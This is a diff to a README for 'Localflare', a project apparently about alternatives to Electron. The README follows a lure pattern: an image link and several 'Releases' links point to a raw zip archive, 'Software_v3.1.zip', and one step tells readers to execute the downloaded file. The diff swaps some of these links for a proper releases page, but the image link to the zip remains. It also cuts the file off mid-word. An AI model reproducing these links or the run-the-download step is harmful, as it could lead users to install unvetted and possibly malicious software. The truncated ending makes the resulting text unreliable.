@@ -1,7 +1,6 @@
 # Localflare: The Best Alternatives to Electron 🎉
 
 ![Localflare](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip)
-![Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip%https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip)
 
 Welcome to the **Localflare** repository! This project explores powerful alternatives to Electron for building cross-platform desktop applications. Whether you are a developer looking for new tools or just curious about alternatives, you are in the right place.
 
@@ -31,16 +30,16 @@ Welcome to the **Localflare** repository! This project explores powerful alterna
 
 ## Getting Started
 
-To get started with Localflare, visit our [Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip) section. Here, you can download the latest version and find installation instructions.
+To get started with Localflare, visit our [Releases](https://github.com/msgithub1/localflare/releases) section. Here, you can download the latest version and find installation instructions.
 
 ## Installation
 
-1. **Download the latest release** from our [Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip) page.
+1. **Download the latest release** from our [Releases](https://github.com/msgithub1/localflare/releases) page.
 2. **Execute the downloaded file** to install Localflare on your system.
 
 ## Usage
 
-Once installed, you can create a new project using Localflare. Here’s a simple example to get you started:
+Once installed, you can create a new project using Localflare. Here's a simple example to get you started:
 
 ```bash
 localflare init my-app
@@ -65,20 +64,4 @@ Each of these alternatives offers unique benefits and can be tailored to fit you
 We welcome contributions from the community! If you have suggestions, bug reports, or would like to contribute code, please follow these steps:
 
 1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Make your changes and commit them.
-4. Push to your branch and submit a pull request.
-
-Your contributions help make Localflare better for everyone.
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
-
-## Contact
-
-For questions or support, please reach out to us through the Issues section of the repository or connect with us on social media.
-
----
-
-Thank you for exploring Localflare! We hope you find it useful in your development journey. Don't forget to check the [Releases](https://raw.githubusercontent.com/msgithub1/localflare/main/localflare/Software_v3.1.zip) for the latest updates and features.
+2. Create a new branch for your f
